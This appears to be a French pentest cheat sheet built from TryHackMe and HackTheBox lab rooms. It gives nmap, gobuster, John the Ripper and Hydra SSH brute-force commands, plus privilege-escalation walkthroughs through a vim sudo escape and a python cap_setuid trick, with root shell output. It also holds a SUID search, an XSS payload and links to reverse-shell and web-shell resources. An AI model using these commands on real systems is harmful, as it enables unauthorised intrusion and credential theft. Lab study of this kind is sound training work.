# (logo pentest) Pentest

## Pentest AD
[Pentest AD MAP](https://www.xmind.net/m/5dypm8/)

## Outils

### NMAP

Suffixes : 
* -sV : affiche la version des services existants sur les ports
* -sC : affiche les scripts par défaut qui sont activés sur les ports

Scan simple et rapide : 
* sudo nmap -sS -T5 <ip>

Exemples : 
* N°1 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    ```$ sudo nmap -sS -Pn -sV 10.10.188.70```

* N°2 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    ```$ sudo nmap -sS -sC 10.10.188.70```

### Gobuster

Source : [gobuster](https://www.le-hacking.fr/brute-force-url-gobuster/)

gobuster -h : ```$ gobuster dir -u http://[adresse IP]:[Port] -w [wordlists]```

Exemples :
<br/>```./gobuster dir -u http://10.10.52.129/ -w /usr/share/wfuzz/wordlist/general/common.txt```

### John2ripper

```$ john-the-ripper --wordlist=Outils/wordlist/rockyou.txt id_rsa_basic_hash.txt ```

Permet de retrouver la passphrase pour se connecter en ssh à un user particulier.

### Hydra 

-l = user
<br/>-L = userlist
<br/>-p = password
<br/>-P = passwordlist

```hydra -l test -P /home/petibonum/Outils/wordlist/rockyou.txt 10.10.11.100 ssh```

user = test
<br/>wordlist = rockyou.txt

[Source](https://linuxtrack.net/viewtopic.php?id=654)

### ADB connect 



[Source](https://labs.f-secure.com/blog/hackin-around-the-christmas-tree/)
## Méthodes
### Escalade de privilège

Exemple : 
* N°1 : TryHackMe -> [SimpleCTF Room](https://tryhackme.com/room/simplectf)

    <br/>```$ sudo -l```
    <br/>ans : User mitch may run the following commands on Machine:
    <br/>ans : (root) NOPASSWD: /usr/bin/vim
    <br/>```$ sudo vim -c ':!/bin/sh'```
    <br/>```# ^[[2;2R^[]11;rgb:3030/0a0a/2424^G```
    <br/>ans : /bin/sh: 1: ot found
    <br/>ans : /bin/sh: 1: 2R: not found
    <br/>```# whoami```
    <br/>ans : root

* N°2 : TryHackMe -> [BasicPentesting Room](https://tryhackme.com/room/basicpentestingjt)
    <br/>```ssh -i /home/<user>/.ssh/id_rsa kay@<ip>```
    <br/> Cette ligne permet de se connecter en ssh à un user par l'intermédiaire d'un autre user présent sur la même machine.

* N°3 : HackTheBox -> [CAP Room](https://app.hackthebox.eu/machines/Cap)

    <br/>```nathan@cap:~$ getcap -r / 2>/dev/null```
    <br/>ans : /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    <br/>ans : /usr/bin/ping = cap_net_raw+ep
    <br/>ans : /usr/bin/traceroute6.iputils = cap_net_raw+ep
    <br/>ans : /usr/bin/mtr-packet = cap_net_raw+ep
    <br/>ans : /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
    <br/>```nathan@cap:~$/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
    <br/>ans : root@cap:~#
    C'est bon, on est root sur la machine.

### XSS payload

Exemple :

* N°1 : ```<script\x20type="text/javascript">javascript:alert(1);</script>```

[XSS Github](https://github.com/payloadbox/xss-payload-list)

### Reverse Shell

[Reverse Shell examples](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

### Recherche FIND spécifique

Rechercher des fichiers avec l'autorisation SUID :
<br/>```find / -user root -perm /4000 2>/dev/null```

### Outils d'encodage

[CyberChef](https://gchq.github.io/CyberChef/)

## Autres Sources

* [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* [SUID vs CAPABILITIES](https://mn3m.info/posts/suid-vs-capabilities/)
* [Linux Privilege Escalation](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)
* [Linux Privilege Escalation with Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
* [Reverse Shell - Synetis](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
